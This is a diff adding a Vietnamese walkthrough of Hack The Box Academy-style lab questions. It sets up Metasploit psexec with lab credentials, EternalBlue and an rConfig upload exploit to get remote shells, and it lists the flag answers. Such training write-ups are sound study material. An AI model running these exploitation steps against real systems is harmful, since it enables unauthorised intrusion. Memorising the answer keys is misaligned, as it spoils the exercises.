@@ -115,20 +115,129 @@ Trên hệ điều hành `Windows` thì `PowerShell` chính là trình thông d�
 
 > **Đáp án:** `powershell`
 
+---
 
+### Q8: Exploit the target using what you've learned in this section, then submit the name of the file located in htb-student's Documents folder. (Format: filename.extension)
 
+Mở phần mềm metasploit:  
+`msfconsole`
 
+![metasploit](./images/pic8.jpg)
 
+Do chạy trên hệ điều hành `Windows` và chạy dịch vụ `SMB`, ta sẽ dùng module `/exploit/windows/smb/psexec`  
+Chạy lệnh `use exploit/windows/smb/psexec`
 
+![metasploit](./images/pic9.jpg)
 
+Mở options: `options`  
+rồi chạy các lệnh:  
+`set RHOSTS 10.129.201.160`  
+`set SMBUser htb-student`  
+`set SMBPass HTB_@cademy_stdnt!`  
+`set LHOST 10.10.16.27`  
+Cuối cùng: `run`
 
+![Options](./images/pic10.jpg)
 
+Cửa sổ `meterpreter` hiện ra tức là chúng ta đã kết nối thành công, chạy lệnh `shell` để vào hệ điều hành
 
+![Shell](./images/pic12.jpg)
 
+Lệnh `dir C:\Users\htb-student\Documents` lấy đáp án
 
+> **Đáp án:** `staffsalaries.txt`
 
+---
 
+### Q9: What file type is a text-based DOS script used to perform tasks from the cli? (answer with the file extension, e.g. '.something')
 
+Đọc qua tài liệu của module ta có thông tin: `Batch file là file DOS được dùng để thực thi nhiều tác vụ thông qua dòng lệnh command control và đuôi của nó là .bat`
 
+> **Đáp án:** `.bat`
 
+---
 
+### Q10: What Windows exploit was dropped as a part of the Shadow Brokers leak? (Format: ms bulletin number, e.g. MSxx-xxx)
+
+> **Đáp án:** `MS17-010`
+
+---
+
+### Q11: Gain a shell on the vulnerable target, then submit the contents of the flag.txt file that can be found in C:\
+
+ta thức hiện nmap quét các cổng dịch vụ của máy nạn nhân  
+`nmap -sV -sC <IP>`
+
+![nmap](./images/pic13.jpg)
+
+Ta thấy máy nạn nhân là thuộc hệ điều hành `Windows` và mở cổng `SMB`, ta sẽ sử dụng công cụ metasploit  
+Mở metasploit: `msfconsole`  
+ta tìm lỗ hổng để dùng cho metasploit: `search eternal`
+
+![search](./images/pic14.jpg)
+
+ta chỉnh địa chỉ `IP đích` và `IP nhận`
+
+![SMB](./images/pic15.jpg)
+
+lệnh `run` để bắt đầu quét bằng metasploit
+
+![sploit](./images/pic16.jpg)
+
+lệnh `shell` để vào cmd của hệ điều hành
+
+![cmd](./images/pic17.jpg)
+
+`type C:\flag.txt` lấy đáp án
+
+![answer](./images/pic18.jpg)
+
+> **Đáp án:** `EB-Still-W0rk$`
+
+---
+
+### Q12: What language is the payload written in that gets uploaded when executing rconfig_vendors_auth_file_upload_rce?
+
+> **Đáp án:** `php`
+
+---
+
+### Q13: Exploit the target and find the hostname of the router in the devicedetails directory at the root of the file system.
+
+Thực hiện nmap quét nạn nhân: 
+
+![nmap](./images/pic19.jpg)
+
+kết hợp với kết quả nmap ở trên và truy cập địa chỉ IP nạn nhân, ta thấy đây là 1 ứng dụng rConfig đã cũ.
+
+![metasploit](./images/pic20.jpg)
+
+Truy cập metasploit và thử search các lỗ hổng đã có của `rconfig`  
+Ta sẽ dùng Module thứ 12 !!!
+
+![metasploit](./images/pic21.jpg)
+
+Tiến hành cài các options cơ bản:
+
+![options](./images/pic22.jpg)
+![options](./images/pic23.jpg)
+
+Sau khi quét xong, màn hình ra tab: `meterpreter` tức đã thành công, ta chạy lệnh `shell` để vào cmd của máy chủ
+
+![shell](./images/pic24.jpg)
+
+Khám phá bên trong: 
+
+![shell](./images/pic25.jpg)
+![shell](./images/pic26.jpg)
+
+Ta thấy folder `/devicedetails` là thư mục có thể chứa đáp án cho câu hỏi này.
+
+![answer](./images/pic27.jpg)
+
+Xem thử nội dung bên trong của file `hostnameinfo.txt` ta thấy nó có bảo hostname của router là chữ cái đứng trước `.yml` mà trong folder này cũng có 1 file tên là `edgerouter-isp.yml`  
+Vậy ta đã tìm ra đáp án
+
+> **Đáp án:** `edgerouter-isp`
+
+---
